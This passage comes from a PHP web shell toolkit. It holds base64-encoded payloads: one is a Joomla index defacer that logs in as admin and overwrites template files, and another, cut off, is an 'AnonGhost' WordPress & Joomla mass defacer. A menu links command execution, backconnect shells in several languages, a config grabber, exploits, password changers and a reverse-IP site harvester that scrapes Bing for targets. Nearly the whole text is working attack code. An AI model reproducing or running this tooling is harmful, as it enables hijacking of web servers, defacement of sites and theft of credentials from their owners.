ICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQoNCn0NCmVsc2UNCnsNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgICAgICBWMS41ICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KCQkgDQokcmVxID1teXNxbF9xdWVyeSgiU0VMRUNUICogZnJvbSAgYCIuJGRicHJlZml4LiJ0ZW1wbGF0ZXNfbWVudWAgV0hFUkUgY2xpZW50X2lkPScwJyIpOw0KCSAkZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KJHRlbXBsYXRlX25hbWU9JGRhdGFbInRlbXBsYXRlIl07DQoNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocCI7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KDQokaGlkZGVuPWVudHJlMnYyKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsMyk7DQoNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocCI7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCJ1c2VybmFtZT1yb290JnBhc3N3ZD1yb290Jm9wdGlvbj1jb21fbG9naW4mdGFzaz1sb2dpbiYiLiRoaWRkZW4uIj0xIik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOw0KY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgJGNvKTsgDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQoNCiRwb3MgPSBzdHJwb3MoJGJ1ZmZlciwiY29tX2NvbmZpZyIpOw0KDQppZigkcG9zID09PSBmYWxzZSkgew0KZWNobygiPGJyPlstXSBMb2dpbiBFcnJvciIpOw0KZXhpdDsNCn0NCmVsc2Ugew0KZWNobygiPGJyPlsrXSBMb2dpbiBTdWNjZXNzZnVsIik7DQp9DQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocD9vcHRpb249Y29tX3RlbXBsYXRlcyZ0YXNrPWVkaXRfc291cmNlJmNsaWVudD0wJmlkPSIuJHRlbXBsYXRlX25hbWU7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KDQokaGlkZGVuMj1lbnRyZTJ2MigkYnVmZmVyICwnPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iJywnIiB2YWx1ZT0iMSInLDYpOw0KDQppZigkaGlkZGVuMikgew0KZWNobygiPGJyPlsrXSBpbmRleC5waHAgZmlsZSBmb3VuZGVkIGluIFRoZW1lIEVkaXRvciIpOw0KfQ0KZWxzZSB7DQplY2hvKCI8YnI+Wy1dIGluZGV4LnBocCBOb3QgZm91bmQgaW4gVGhlbWUgRWRpdG9yIik7DQp9DQoNCmVjaG8oIjxicj5bKl0gVXBkYXRpbmcgSW5kZXgucGhwIC4uLi4uIik7DQokdXJsMj0kc2l0ZV91cmwuIi9pbmRleC5waHA/b3B0aW9uPWNvbV90ZW1wbGF0ZXMmbGF5b3V0PWVkaXQiOw0KJGNoID0gY3VybF9pbml0KCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywiZmlsZWNvbnRlbnQ9Ii4kaC4iJmlkPSIuJHRlbXBsYXRlX25hbWUuIiZjaWRbXT0iLiR0ZW1wbGF0ZV9uYW1lLiImIi4kaGlkZGVuMi4iPTEmdGFzaz1zYXZlX3NvdXJjZSZjbGllbnQ9MCIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAkY28pOyANCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgJGNvKTsgDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQoNCiRwb3MgPSBzdHJwb3MoJGJ1ZmZlciwnPGRkIGNsYXNzPSJtZXNzYWdlIG1lc3NhZ2UgZmFkZSI+Jyk7DQppZigkcG9zID09PSBmYWxzZSkgew0KZWNobygiPGJyPlstXSBVcGRhdGluZyBJbmRleC5waHAgRXJyb3IiKTsNCmV4aXQ7DQp9DQplbHNlIHsNCmVjaG8oIjxicj5bK10gSW5kZXgucGhwIHN1Y2Nlc3NmdWxseSBzYXZlZCIpOw0KfQ0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgICAgICBWMS41ICBFTkQgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQp9DQoNCn0NCg0KDQpmdW5jdGlvbiByYW5kb210KCkgeyANCg0KICAgICRjaGFycyA9ICJhYmNkZWZnaGlqa21ub3BxcnN0dXZ3eHl6MDIzNDU2Nzg5IjsgDQogICAgc3JhbmQoKGRvdWJsZSltaWNyb3RpbWUoKSoxMDAwMDAwKTsgDQogICAgJGkgPSAwOyANCiAgICAkcGFzcyA9ICcnIDsgDQoNCiAgICB3aGlsZSAoJGkgPD0gNykgeyANCiAgICAgICAgJG51bSA9IHJhbmQoKSAlIDMzOyANCiAgICAgICAgJHRtcCA9IHN1YnN0cigkY2hhcnMsICRudW0sIDEpOyANCiAgICAgICAgJHBhc3MgPSAkcGFzcyAuICR0bXA7IA0KICAgICAgICAkaSsrOyANCiAgICB9IA0KDQogICAgcmV0dXJuICRwYXNzOyANCg0KfQ0KDQpmdW5jdGlvbiBlbnRyZTJ2MigkdGV4dCwkbWFycXVldXJEZWJ1dExpZW4sJG1hcnF1ZXVyRmluTGllbiwkaT0xKQ0KDQp7DQoNCiRhcjA9ZXhwbG9kZSgkbWFycXVldXJEZWJ1dExpZW4sICR0ZXh0KTsNCiRhcjE9ZXhwbG9kZSgkbWFycXVldXJGaW5MaWVuLCAkYXIwWyRpXSk7DQokYXI9dHJpbSgkYXIxWzBdKTsNCnJldHVybiAkYXI7DQp9DQplY2hvICINClxuIjsgDQplY2hvICI8dGl0bGU+cm9vdCAuLS48L3RpdGxlPg0KXG4iOyANCmVjaG8gIiA8c3R5bGU+DQpcbiI7IA0KZWNobyAiDQpcbiI7IA0KZWNobyAiQk9EWSB7IFNDUk9MTEJBUi1CQVNFLUNPTE9SOiAjMTkxOTE5OyBTQ1JPTExCQVItQVJST1ctQ09MT1I6IG9saXZlOyAgIGNvbG9yOiB3aGl0ZTt9DQpcbiI7IA0KZWNobyAidGV4dGFyZWF7YmFja2dyb3VuZC1jb2xvcjojMTkxOTE5O2NvbG9yOnJlZDtmb250LXdlaWdodDpib2xkO2ZvbnQtc2l6ZTogMTJweDtmb250LWZhbWlseTogT3JiaXRyb247IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7fQ0KXG4iOyANCmVjaG8gImlucHV0e0ZPTlQtV0VJR0hUOm5vcm1hbDtiYWNrZ3JvdW5kLWNvbG9yOiAjMTkxOTE5O2ZvbnQtc2l6ZTogMTNweDtmb250LXdlaWdodDpib2xkO2NvbG9yOiByZWQ7IGZvbnQtZmFtaWx5OiBPcmJpdHJvbjsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjtoZWlnaHQ6MTd9DQpcbiI7IA0KZWNobyAiPC9zdHlsZT4NClxuIjsgDQplY2hvICI8Y2VudGVyPg0KXG4iOyANCmVjaG8gIjxmb250IGNvbG9yPVwiI0ZGRkY2RkZcIiBzaXplPScrMycgZmFjZT0nT3JiaXRyb24nPlsgfn4gQ2hhbmdlIEpvb21sYSBJbmRleCB+fiBdPC9mb250Pjxicj48YnI+DQpcbiI7IA0KZWNobyAiPEZPUk0gYWN0aW9uPVwiXCIgIG1ldGhvZD1cInBvc3RcIj4NClxuIjsgDQplY2hvICI8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJmb3JtX2FjdGlvblwiIHZhbHVlPVwiMlwiPg0KXG4iOyANCmVjaG8gIjxicj4NClxuIjsgDQplY2hvICI8dGFibGUgYm9yZGVyPTE+DQpcbiI7IA0KZWNobyAiDQpcbiI7IA0KZWNobyAiPHRyPjx0ZD5kYl9wcmVmaXggPC90ZD48dGQ+PGlucHV0IHR5cGU9XCJ0ZXh0XCIgc2l6ZT1cIjMwXCIgbmFtZT1cImRiX3ByZWZpeFwiIHZhbHVlPVwiam9zX1wiPjwvdGQ+PC90cj4NClxuIjsgDQplY2hvICI8dHI+PHRkPmRiX3VzZXJuYW1lIDwvdGQ+PHRkPjxpbnB1dCB0eXBlPVwidGV4dFwiIHNpemU9XCIzMFwiIG5hbWU9XCJkYl91c2VybmFtZVwiIHZhbHVlPVwiXCI+PC90ZD48L3RyPg0KXG4iOyANCmVjaG8gIjx0cj48dGQ+ZGJfcGFzc3dvcmQ8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBzaXplPVwiMzBcIiBuYW1lPVwiZGJfcGFzc3dvcmRcIiB2YWx1ZT1cIlwiPjwvdGQ+PC90cj4NClxuIjsgDQplY2hvICI8dHI+PHRkPmRiX25hbWU8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBzaXplPVwiMzBcIiBuYW1lPVwiZGJfbmFtZVwiIHZhbHVlPVwiXCI+PC90ZD48L3RyPg0KXG4iOyANCmVjaG8gIjx0cj48dGQ+QWRtaW4gQ29udHJvbCBwYW5lbCB1cmw8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBzaXplPVwiNjBcIiBuYW1lPVwic2l0ZV91cmxcIiB2YWx1ZT1cImh0dHA6Ly9zaXRlLmNvbS9hZG1pbmlzdHJhdG9yL1wiPjwvdGQ+PC90cj4NClxuIjsgDQplY2hvICINClxuIjsgDQplY2hvICI8L3RhYmxlPg0KXG4iOyANCmVjaG8gIjxicj4NClxuIjsgDQplY2hvICI8YnI+DQpcbiI7IA0KZWNobyAiPFRFWFRBUkVBIHJvd3M9XCIxOFwiICBjb2xzPVwiNTBcIiBuYW1lPVwiY29kZVwiPjwvVEVYVEFSRUE+DQpcbiI7IA0KZWNobyAiCTxicj4NClxuIjsgDQplY2hvICI8SU5QVVQgY2xhc3M9c3VibWl0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIlN1Ym1pdFwiIG5hbWU9XCJTdWJtaXRcIj4NClxuIjsgDQplY2hvICI8L0ZPUk0+DQpcbiI7IA0KPz4=';
$file = fopen("zjommindexz.php" ,"w+");
$write = fwrite ($file ,base64_decode($coddd));
fclose($file);

echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Joomla Index Changer</span><br><iframe src=zjommindexz.php width=75% height=60% frameborder=0></iframe></div></center>"; 
}
if(isset($_GET['action']) && $_GET['action'] == 'joomlarvrssrvetll'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Joomla Reverse Server</span></font></center><br>';
echo '<center>  
<form method="post" action="" enctype="multipart/form-data">  
<input type="text" name="ip" value="" placeholder="Extract From ip" size="15"> <input type=submit name=get value=&nbsp;&nbsp;Get&nbsp;&nbsp; />  
<br>  <br>
<textarea class="area"name="sites" cols="40" rows="13">';  
if(isset($_POST['get']) && $_POST['ip'] != ""){  
        $target = $_POST['ip'];  
        $sites = mbing("ip:$target index.php?option=com");  
        if(!empty($sites)){  
        $targets = implode("\n",cln_arr(array_map("jos_site",$sites)));  
        echo $targets;  
        }else{  
            echo "No Joomla Found.";  
        }  
}  
echo '</textarea></center>';  

function mbing($what){  
    for($i = 1; $i <= 2000; $i += 10){  
        $ch = curl_init();  
        curl_setopt ($ch, CURLOPT_URL, "http://www.bing.com/search?q=".str_replace(" ","+", $what)."&first=$i");  
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");  
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);      
        curl_setopt ($ch, CURLOPT_COOKIEFILE,getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);  
        $data = curl_exec($ch);  
        preg_match_all('#<h2 class="sb_h3 cttl"><a href="(https?://.*?)" _ctf="rdr_T"#',$data, $links);  
        foreach($links[1] as $link){  
            $allLinks[] = $link;  
        }  
        if(!preg_match('#class="sb_pagN"#',$data)) break;  
    }  
      
    if(!empty($allLinks) && is_array($allLinks)){  
        return array_unique($allLinks);  
    }  
}  

function cln_arr($array){  
    return @array_filter(@array_unique($array));  
}  
function jos_site($site){  
    return (preg_match("/option/",$site)) ? preg_replace("#(.*?)/index(.*)|(.*?)/?option(.*)#","$1/",$site):false;  
}
}
if(isset($_GET['action']) && $_GET['action'] == 'wordddprssrrrvrse'){
echo '<center><b class="conte">
<a href="?action=mysqslsls">MySQL & PostgreSql Connect</a> -
<a href="?action=cmd">Command Execution</a> -
<a href="?action=com64">Base64 Command</a> -
<a href="?action=vgrab">Config Grabber</a> -
<a href="?action=subdomainchkrezes">Subdomain Checker</a> -
<a href="?action=joomlarvrssrvetll">Joomla Reverse Server</a> -    
<a href="?action=wordddprssrrrvrse">Wordpress Reverse Server</a> -
<a href="?action=cari">Find Directory Writable/Readable</a> -
<a href="?action=zonh">Zone-h Notifier</a> -
<a href="?action=shhhshell">Shtml Command Shell</a> -
<a href="?action=beko">Back connect Simple</a> -
<a href="?action=rubybckconnnect">Ruby BackConnect</a> -
<a href="?action=prlbckacnonect">Perl BackConnect</a> -
<a href="?action=pythnonbakcncete">Python BackConnect</a> -
<a href="?action=exploit">Exploit</a> -
<a href="?action=whmcskillrer">Whcms Killer</a> -
<a href="?action=webmllllpwdchnger">Webmail Password Changer</a> -
<a href="?action=wpcdrfex">Wordpress Csrf Exploit</a>
</center>
</b>';

echo"<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Wordpress Reverse Server</span></center><br>";
echo '<center>
<form method="post" action="" enctype="multipart/form-data">  
<input type="text" name="ip" value="" placeholder="Extract From ip" size="15"> <input type=submit name=get value=&nbsp;&nbsp;Get&nbsp;&nbsp; /><br>  
<br />  
<textarea class="area" name="sites" cols="40" rows="13">';  
if(isset($_POST['get']) && $_POST['ip'] != ""){  
        $target = $_POST['ip'];  
        $dorks = array('/?page_id=', '/wp-content/');          
        foreach($dorks as $dork){  
            $sites = mbing("ip:$target $dork");  
            if(!empty($sites)){  
                $targets = implode("\n",cln_arr(array_map("wp_site",$sites)));  
                echo $targets."\n";  
            }  
        }  
          
}  
echo '</textarea></center>';  

function mbing($what){  
    for($i = 1; $i <= 2000; $i += 10){  
        $ch = curl_init();  
        curl_setopt ($ch, CURLOPT_URL, "http://www.bing.com/search?q=".str_replace(" ","+", $what)."&first=$i");  
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16");  
        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);      
        curl_setopt ($ch, CURLOPT_COOKIEFILE,getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');  
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);  
        $data = curl_exec($ch);  
        preg_match_all('#<h2 class="sb_h3 cttl"><a href="(https?://.*?)" _ctf="rdr_T"#',$data, $links);  
        foreach($links[1] as $link){  
            $allLinks[] = $link;  
        }  
        if(!preg_match('#class="sb_pagN"#',$data)) break;  
    }  
      
    if(!empty($allLinks) && is_array($allLinks)){  
        return array_unique($allLinks);  
    }  
}  

function cln_arr($array){  
    return @array_filter(@array_unique($array));  
}  

function wp_site($site){  
    return (eregi("wp-content",$site) or eregi("page_id=",$site)) ? str_replace("?","",preg_replace("#(.*?)/(\?page_id=|wp-content)(.*)#","$1",$site)):false;  
}
}

if(isset($_GET['action']) && $_GET['action'] == 'tule'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'sime'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'brut'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'baipas'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'mase'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'sesc'){
?><?php
}
if(isset($_GET['action']) && $_GET['action'] == 'wpandjmlamassdfce'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=joommlallainxc">Joomla Index Changer</a> -
<a href="?action=wpidxcngrdesr">Wordpress Index Changer</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
//extract script
$gfgf4fff = 'PD9waHANCi8qDQpXb3JkcHJlc3MgJiBKb29tbGEgTWFzcyBEZWZhY2VyIFYyDQpOb3QgQ29kZWQgQnkgQW5vbkdob3N0T2ZmaWNpYWwgLCBidXQgb25seSB0aGUgZGVzaWduDQpmYWNlYm9vayA6IC9Bbm9uR2hvc3RPZmZpY2lhbDINCg0KdGhpcyB2ZXJzaW9uIHVzZXMgdHdvIG1ldGhvZHMgZm9yIGdldHRpbmcgc2l0ZXMgJiB1c2VycyAmIGNvbmZpZyBmaWxlDQpbK10gdGhlIGZpcnN0IG1ldGhvZCBpcyBnZXR0aW5nIGV2ZXJ5dGhpbmcgYWJvdXQgdGhlIGRvbWFpbiBmcm9tICggL2V0Yy9uYW1lZC5jb25mICkgLCBhbmQgZGVmYWNpbmcNClsrXSB0aGUgc2Vjb25kIG1ldGhvZCBpcyBnZXR0aW5nIHNpdGVzIG5hbWVzIGZyb20gKCAvdmFyL25hbWVkICkgLCB0aGVuIGNvbGxlY3RpbmcgdXNlcm5hbWVzIG5hZCBkZWZhY2luZw0KDQpkb24ndCB3b3JyeSBhYm91dCB0aGUgYmFzZTY0IGVuY3J5cHRpb24gaW4gbGluZXMgMjAgYW5kIDI1ICwganVzdCB0aGUgc3R5bGUgLCBhbmQgdGhlIHNjcmlwdCBuYW1lDQp5b3UgY2FuIGRlY29kZSBhbmQgY2hlY2sgdGhlbSBpZiB5b3UgZG9uJ3QgdHJ1c3QgbWUgOykNCiovDQplY2hvICcNCjxodG1sPg0KPC9oZWFkPg0KPHRpdGxlPkFub25HaG9zdCAgOiBXb3JkcHJlc3MgJiBKb29tbGEgTWFzcyBEZWZhY2VyPC90aXRsZT4NCjxsaW5rIGhyZWY9Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PU9yYml0cm9uOjcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+DQo8Y2VudGVyPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCnRhYmxlLGJvZHkgew0KYmFja2dyb3VuZC1pbWFnZTogdXJsKCJodHRwOi8vaW1nMTUuaG9zdGluZ3BpY3MubmV0L3BpY3MvMTE1ODMwdGxjaGFyZ2VtZW50LnBuZyIpOw0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCmJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsNCmNvbG9yOmJsYWNrOw0KZm9udC1mYW1pbHk6ICJUcmVidWNoZXQgTVMiLEFyaWFsO2JhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDttYXJnaW46MDtwYWRkaW5nOjA7fQ0KLmhlYWRlciB7cG9zaXRpb246Zml4ZWQ7d2lkdGg6MTAwJTt0b3A6MDtiYWNrZ3JvdW5kOiMwMDA7fQ0KLmZvb3RlciB7cG9zaXRpb246Zml4ZWQ7d2lkdGg6MTAwJTtib3R0b206MDtiYWNrZ3JvdW5kOiMwMDA7fQ0KaW5wdXRbdHlwZT0ic3VibWl0Il17YmFja2dyb3VuZC1jb2xvcjpyZ2JhKDI1LDI1LDI1LDAuNik7Ym9yZGVyOjE7IHBhZGRpbmc6MnB4OyBmb250LXNpemU6MjVweDtmb250LWZhbWlseTpvcmJpdHJvbjsgY29sb3I6cmVkO2JvcmRlcjoycHggc29saWQgd2hpdGU7bWFyZ2luOjRweCA0cHggOHB4IDA7fQ0KaW5wdXRbdHlwZT0ic3VibWl0Il06aG92ZXJ7Y29sb3I6U2VhU2hlbGw7fQ0KaW5wdXRbdHlwZT0idGV4dCJdOmhvdmVye2JhY2tncm91bmQ6IzIyMjIyMjt9DQppbnB1dFt0eXBlPSJyYWRpbyJde21hcmdpbi10b3A6IDA7fQ0KLnRkMiB7Ym9yZGVyLWxlZnQ6MXB4IHNvbGlkIHJlZDtib3JkZXItcmFkaXVzOiAycHggMnB4IDJweCAycHg7fQ0KaW5wdXRbdHlwZT0idGV4dCJdIHtvdXRsaW5lOm5vbmU7dHJhbnNpdGlvbjogYWxsIDAuMjBzIGVhc2UtaW4tb3V0Oy13ZWJraXQtdHJhbnNpdGlvbjogYWxsIDAuMjBzIGVhc2UtaW4tb3V0Oy1tb3otdHJhbnNpdGlvbjogYWxsIDAuMjBzIGVhc2UtaW4tb3V0Oy1tb3otYm9yZGVyLXJhZGl1czogNnB4OyBib3JkZXItcmFkaXVzOiAxMnB4O2JhY2tncm91bmQ6IzExMTExMTsgYm9yZGVyOjE7IHBhZGRpbmc6MnB4OyBmb250LWZhbWlseTpvcmJpdHJvbjsgZm9udC1zaXplOjE1cHg7IGNvbG9yOiNmZmZmZmY7Ym9yZGVyOjJweCBzb2xpZCAjNEM4M0FGO21hcmdpbjo0cHggNHB4IDhweCAwO30NCi5ldmVuIHtiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDI1LCAyNSwgMjUsIDAuNik7fQ0KLm9kZCB7YmFja2dyb3VuZC1jb2xvcjogcmdiYSgxMDIsIDEwMiwgMTAyLCAwLjYpO30NCmEge2NvbG9yOiNmZmY7fSBhOmhvdmVyIHtjb2xvcjpyZWQ7fQ0KZmllbGRzZXR7Ym9yZGVyOiAxcHggc29saWQgZ3JleTsgYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjcpOyB3aWR0aDogNjAwcHg7IG1hcmdpbjogMCBhdXRvO21pbi1oZWlnaHQ6MjQwcHg7fQ0KdGV4dGFyZWF7YmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjYpOyBjb2xvcjogd2hpdGU7fQ0KLmdyZWVuIHtjb2xvcjojMDBGRjAwO2ZvbnQtd2VpZ2h0OmJvbGQ7fQ0KLnJlZCB7Y29sb3I6I0ZGMDAwMDtmb250LXdlaWdodDpib2xkO30NCi5raWxsbWUge2ZvbnQtZmFtaWx5Om9yYml0cm9uO3Bvc2l0aW9uOiBmaXhlZDsgdG9wOiAyMHB4OyByaWdodDogMjBweDsgYm9yZGVyOiAycHggc29saWQgIzRDODNBRjsgcGFkZGluZzogMTBweDsgZm9udC1zaXplOiAyMHB4OyBjb2xvcjogd2hpdGU7IGZvbnQtd2VpZ2h0OiBib2xkO30NCiANCi5yZXN1bHQge2JvcmRlcjoycHggc29saWQgIzRDODNBRjstbW96LWJvcmRlci1yYWRpdXM6MTBweDtib3JkZXItcmFkaXVzOjEwcHg7fSANCg0KPC9zdHlsZT4NCiA8Y2VudGVyPjxoMT5Bbm9uR2hvc3QgV29yZHByZXNzICYgSm9vbWxhIE1hc3MgRGVmYWNlciA8L2gxPjwvY2VudGVyPg0KIDwvaGVhZD4NCiA8Ym9keT4nOw0KDQoNCi8vIGdldHRpbmcgaW5mbyBmcm9tIGluc2lkZSA6KQ0KZnVuY3Rpb24gdHVuaXNpYSgkdGV4dCwkYmlkZXlhLCRuaWhleWEsJGk9MSl7DQogICAgJGFyMD1leHBsb2RlKCRiaWRleWEsICR0ZXh0KTsNCiAgICAkYXIxPWV4cGxvZGUoJG5paGV5YSwgJGFyMFskaV0pOw0KICAgIHJldHVybiB0cmltKCRhcjFbMF0pOw0KfQ0KDQpmdW5jdGlvbiByYW5kb210KCkgew0KICAgICRjaGFycyA9ICJhYmNkZWZnaGlqa21ub3BxcnN0dXZ3eHl6MDIzNDU2Nzg5IjsNCiAgICBzcmFuZC